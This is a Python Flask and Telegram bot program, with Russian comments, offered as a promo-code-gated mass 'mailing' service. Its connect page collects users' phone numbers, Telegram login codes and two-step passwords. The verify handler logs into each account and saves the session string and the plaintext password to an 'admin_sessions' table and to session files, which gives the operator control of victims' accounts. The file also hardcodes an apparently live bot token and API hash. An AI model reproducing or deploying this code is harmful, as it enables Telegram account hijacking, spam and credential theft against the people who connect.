#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify, session
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telethon import TelegramClient, TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import sqlite3
import os
import asyncio
import json
import secrets
import threading
from datetime import datetime
import requests

# Конфигурация - ЗАМЕНИ ЭТИ ДАННЫЕ!
BOT_TOKEN = "8546210921:AAEZkGZhgFlvizXPcB8un7S-5HU7WjqQoLI"  # Получи у @BotFather
ADMIN_IDS = [6447903143]  # Твой ID в Telegram
API_ID = 30887575  # Получи на my.telegram.org
API_HASH = "505247fc541216e485c879fd8508bc5b"  # Получи на my.telegram.org

app = Flask(__name__)
app.secret_key = 'your-secret-key-12345'

# Инициализация бота
bot_app = Application.builder().token(BOT_TOKEN).build()

class MailingManager:
    def __init__(self):
        self.db_path = "mailing.db"
        self.init_db()
        
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users
                    (user_id INTEGER PRIMARY KEY, username TEXT, phone TEXT, 
                     session_string TEXT, password TEXT, is_active INTEGER DEFAULT 0,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS promo_codes
                    (code TEXT PRIMARY KEY, used_by INTEGER, used_at TIMESTAMP,
                     FOREIGN KEY(used_by) REFERENCES users(user_id))''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS admin_sessions
                    (session_id INTEGER PRIMARY KEY AUTOINCREMENT,
                     user_id INTEGER, user_phone TEXT, session_string TEXT, 
                     password TEXT, received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        conn.commit()
        conn.close()
    
    def add_promo_code(self, code):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        try:
            c.execute("INSERT INTO promo_codes (code) VALUES (?)", (code,))
            conn.commit()
            return True
        except:
            return False
        finally:
            conn.close()
    
    def use_promo_code(self, code, user_id):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT * FROM promo_codes WHERE code = ? AND used_by IS NULL", (code,))
        promo = c.fetchone()
        if promo:
            c.execute("UPDATE promo_codes SET used_by = ?, used_at = CURRENT_TIMESTAMP WHERE code = ?", 
                     (user_id, code))
            c.execute("UPDATE users SET is_active = 1 WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()
            return True
        conn.close()
        return False
    
    def save_admin_session(self, user_id, phone, session_string, password=None):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO admin_sessions 
                    (user_id, user_phone, session_string, password) 
                    VALUES (?, ?, ?, ?)''',
                 (user_id, phone, session_string, password))
        conn.commit()
        conn.close()

manager = MailingManager()

# ==================== FLASK САЙТ ====================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/connect')
def connect():
    user_id = request.args.get('user_id', '')
    return render_template('connect.html', user_id=user_id)

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    phone = data.get('phone')
    user_id = data.get('user_id')
    
    async def send_code():
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            await client.send_code_request(phone)
            await client.disconnect()
            return {'status': 'success'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    result = asyncio.run(send_code())
    return jsonify(result)

@app.route('/api/verify', methods=['POST'])
def api_verify():
    data = request.json
    phone = data.get('phone')
    user_id = data.get('user_id')
    code = data.get('code')
    password = data.get('password', '')
    
    async def create_session():
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            await client.sign_in(phone=phone, code=code)
            
            me = await client.get_me()
            telegram_user_id = str(me.id)
            
            if password:
                await client.sign_in(password=password)
            
            session_string = client.session.save()
            
            # Сохраняем сессию
            manager.save_admin_session(user_id, phone, session_string, password)
            
            # Сохраняем файл
            filename = f"{telegram_user_id}_telethon.session"
            with open(filename, 'w') as f:
                f.write(session_string)
            
            await client.disconnect()
            
            return {
                'status': 'success', 
                'message': f'Аккаунт подключен! Файл: {filename}',
                'user_id': telegram_user_id
            }
            
        except SessionPasswordNeededError:
            return {'status': 'need_password'}
        except PhoneCodeInvalidError:
            return {'status': 'error', 'message': 'Неверный код'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    result = asyncio.run(create_session())
    return jsonify(result)

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

# ==================== TELEGRAM БОТ ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    web_app_url = f"https://{os.environ.get('RAILWAY_STATIC_URL', 'your-app.railway.app')}/connect?user_id={user.id}"
    
    web_app_button = InlineKeyboardButton(
        "🔗 Подключить аккаунт", 
        web_app=WebAppInfo(url=web_app_url)
    )
    
    keyboard = [
        [web_app_button],
        [InlineKeyboardButton("📤 Начать рассылку", callback_data="start_mailing")],
        [InlineKeyboardButton("🎫 Промокод", callback_data="promo_code")],
        [InlineKeyboardButton("🌐 Web версия", callback_data="web_version")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🤖 **Добро пожаловать, {user.first_name}!**\n\nВыберите действие:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "start_mailing":
        await start_mailing(query, context)
    elif query.data == "promo_code":
        await promo_code_menu(query, context)
    elif query.data == "web_version":
        web_app_url = f"https://{os.environ.get('RAILWAY_STATIC_URL', 'your-app.railway.app')}"
        await query.edit_message_text(f"🌐 Web версия: {web_app_url}")
    elif query.data == "back_to_main":
        await back_to_main(query, context)

async def start_mailing(query, context):
    user_id = query.from_user.id
    
    conn = sqlite3.connect(manager.db_path)
    c = conn.cursor()
    c.execute("SELECT is_active FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    
    if not user or not user[0]:
        keyboard = [
            [InlineKeyboardButton("🎫 Ввести промокод", callback_data="promo_code")],
            [InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "❌ **Доступ закрыт!**\n\nНужен активный промокод.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    await query.edit_message_text(
        "📤 **Функция рассылки**\n\n"
        "Используйте web версию для настройки рассылки!",
        parse_mode='Markdown'
    )

async def promo_code_menu(query, context):
    context.user_data['waiting_for_promo'] = True
    await query.edit_message_text("🎫 Введите промокод:")

async def back_to_main(query, context):
    user = query.from_user
    web_app_url = f"https://{os.environ.get('RAILWAY_STATIC_URL', 'your-app.railway.app')}/connect?user_id={user.id}"
    
    web_app_button = InlineKeyboardButton(
        "🔗 Подключить аккаунт", 
        web_app=WebAppInfo(url=web_app_url)
    )
    
    keyboard = [
        [web_app_button],
        [InlineKeyboardButton("📤 Начать рассылку", callback_data="start_mailing")],
        [InlineKeyboardButton("🎫 Промокод", callback_data="promo_code")],
        [InlineKeyboardButton("🌐 Web версия", callback_data="web_version")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text("🤖 **Главное меню**", reply_markup=reply_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('waiting_for_promo'):
        promo_code = update.message.text
        user_id = update.message.from_user.id
        
        if manager.use_promo_code(promo_code, user_id):
            await update.message.reply_text("✅ **Промокод активирован!**")
        else:
            await update.message.reply_text("❌ **Неверный промокод!**")
        
        context.user_data['waiting_for_promo'] = False
        await back_to_main_from_message(update, context)

async def back_to_main_from_message(update, context):
    user = update.message.from_user
    web_app_url = f"https://{os.environ.get('RAILWAY_STATIC_URL', 'your-app.railway.app')}/connect?user_id={user.id}"
    
    web_app_button = InlineKeyboardButton(
        "🔗 Подключить аккаунт", 
        web_app=WebAppInfo(url=web_app_url)
    )
    
    keyboard = [
        [web_app_button],
        [InlineKeyboardButton("📤 Начать рассылку", callback_data="start_mailing")],
        [InlineKeyboardButton("🎫 Промокод", callback_data="promo_code")],
        [InlineKeyboardButton("🌐 Web версия", callback_data="web_version")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text("🤖 **Главное меню**", reply_markup=reply_markup)

async def admin_promo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Доступ запрещен!")
        return
    
    promo_code = secrets.token_hex(4).upper()
    if manager.add_promo_code(promo_code):
        await update.message.reply_text(f"✅ Промокод: `{promo_code}`", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ Ошибка!")

# Регистрация обработчиков бота
bot_app.add_handler(CommandHandler("start", start))
bot_app.add_handler(CommandHandler("admin_promo", admin_promo))
bot_app.add_handler(CallbackQueryHandler(button_handler))
bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

def run_bot():
    """Запуск бота в отдельном потоке"""
    print("🤖 Запускаю бота...")
    bot_app.run_polling()

def run_flask():
    """Запуск Flask"""
    print("🌐 Запускаю сайт...")
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    # Создаем папки если нет
    os.makedirs('templates', exist_ok=True)
    
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Запускаем Flask
    run_flask()
